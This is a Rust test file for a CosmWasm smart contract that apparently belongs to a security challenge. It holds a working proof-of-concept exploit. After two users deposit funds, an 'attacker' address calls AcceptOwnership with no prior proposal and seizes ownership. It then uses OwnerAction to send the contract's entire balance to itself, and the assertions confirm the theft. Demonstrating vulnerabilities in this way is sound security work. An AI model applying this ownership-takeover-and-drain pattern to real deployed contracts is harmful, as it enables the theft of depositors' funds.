#[cfg(test)]
pub mod tests{
    use cosmwasm_std::{Addr, Uint128, CosmosMsg, BankMsg, coin};
    use cw_multi_test::{Executor, App};

    use crate::{integration_tests::tests::{proper_instantiate, ADMIN, base_scenario, USER2, mint_tokens, USER1, challenge_contract}, state::State, msg::{QueryMsg, ExecuteMsg, InstantiateMsg}, contract::DENOM};
    pub const ATTACKER : &str = "attacker";
    #[test]
    fn ownership_flow_exploit() {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {
            owner: ADMIN.to_string(),
        };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // User 1 deposit
        app = mint_tokens(app, USER1.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // User 2 deposit
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();
    
    
        // attacker takes contract ownership
        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::AcceptOwnership {},
            &[],
        )
        .unwrap();

        
        // verify contract is not empty
        let initial_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        assert_eq!(initial_contract_balance.amount, Uint128::new(20_000));

        // craft attack message
        let transfer_msg = CosmosMsg::Bank(BankMsg::Send {
            to_address: ATTACKER.to_string(),
            amount: vec![initial_contract_balance.clone()],
        });

        app.execute_contract(
            Addr::unchecked(ATTACKER),
            contract_addr.clone(),
            &ExecuteMsg::OwnerAction { msg: transfer_msg },
            &[],
        )
        .unwrap();

        // verify the attacker stole all the funds
        let attacker_balance = app
            .wrap()
            .query_balance(ATTACKER.to_string(), DENOM)
            .unwrap();

        assert_eq!(attacker_balance.amount, initial_contract_balance.amount);

        // verify contract is empty
        let final_contract_balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), DENOM)
            .unwrap();

        assert_eq!(final_contract_balance.amount, Uint128::zero());
    }
}